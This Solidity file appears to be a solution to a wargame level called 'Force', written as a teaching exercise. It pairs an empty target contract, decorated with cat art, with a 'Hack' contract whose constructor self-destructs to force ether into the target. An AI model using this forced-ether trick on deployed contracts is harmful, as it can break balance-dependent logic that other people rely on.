// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


// the goal is to send eth to this contract 
// it dosnt have any payable func or fallbacks or receive funcs 

// the other forcefull way to send money to this contract is using selfdistruct 
// create a contract -> call self distruct on it -> this will delete the contract and forcefully send all its eth toh specified target

contract Hack{
    constructor (address payable _target) payable {
        selfdestruct(_target);
    }
}